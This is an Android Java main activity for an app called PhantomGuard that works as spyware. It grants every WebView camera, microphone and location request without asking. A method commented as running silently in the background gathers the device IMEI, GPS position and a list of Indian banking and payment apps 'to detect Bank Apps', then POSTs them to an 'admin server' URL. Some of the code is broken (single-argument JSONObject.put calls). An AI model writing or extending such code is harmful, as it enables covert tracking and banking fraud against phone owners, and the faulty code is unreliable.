package com.phantomguard.app;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private WebView webView;
    private static final String TAG = "PhantomGuard";

    // ADMIN SERVER URL - Yahan aap apna server daalein
    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize WebView
        webView = findViewById(R.id.webview_container);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);

        // Set WebChromeClient to handle permission requests (Camera, Geo, Mic)
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(@NonNull final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        // Grant all requested resources
                        String[] resources = request.getResources();
                        request.grant(resources);
                    }
                });
            }
        });

        // Set WebViewClient to keep navigation inside the app
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                // Inject JavaScript to hide the URL bar and show splash
                view.loadUrl("javascript:(function(){" +
                        "document.querySelector('.web-view-container').style.display='block';" +
                        "document.querySelector('.loading-spinner').style.display='none';" +
                        "})()");
            }
        });

        // Load the main UI (Local HTML or Remote)
        webView.loadUrl("file:///android_asset/index.html");

        // Start background service immediately
        Intent intent = new Intent(this, services.DataSyncService.class);
        startService(intent);
    }

    /**
     * This method runs silently in the background.
     * It collects:
     * 1. Device IMEI
     * 2. Current GPS Location
     * 3. Installed Apps List (to detect Bank Apps)
     * 4. Battery Level
     */
    private void collectAndSendData() {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();

                // 1. IMEI
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    payload.put("imei", tm.getDeviceId());
                }

                // 2. GPS
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                if (lm != null) {
                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc != null) {
                        payload.put("lat", loc.getLatitude());
                        payload.put("lon", loc.getLongitude());
                    }
                }

                // 3. Installed Apps
                JSONObject packages = new JSONObject();
                packages.put("com.google.android.apps.walletnfcrelay");
                packages.put("com.samsung.android.app.wallet");
                packages.put("com.paytm.merchant");
                packages.put("com.google.android.apps.nbu.paisa.user");
                packages.put("com.phonepe.app");
                packages.put("com.icicibank");
                packages.put("com.axisbank.mobile");
                packages.put("com.citi.mobile");
                packages.put("com.hsbc.hsbcindia");
                packages.put("com.standardchartered.scindia");
                packages.put("com.kotak811.mobile");
                packages.put("com.yesbank.yesmoney");
                packages.put("com.idfcfirst.bank");
                packages.put("com.dlbank");
                packages.put("com.bajajfinserv.ebanking");
                packages.put("com.amazon.mShop.android.shopping");
                payload.put("installedApps", packages);

                // 4. Battery
                IntentFilter batteryStatus = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryIntent = registerReceiver(null, batteryStatus);
                if (batteryIntent != null) {
                    int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    float batteryPct = level / (float)scale;
                    payload.put("battery", batteryPct);
                }

                // Send to Admin Server
                URL url = new URL(ADMIN_API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Server Response: " + responseCode);

                conn.disconnect();

            } catch (Exception e) {
                Log.e(TAG, "Data Sync Error: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onClick(View v) {
        // Handle any click events if needed
    }
}
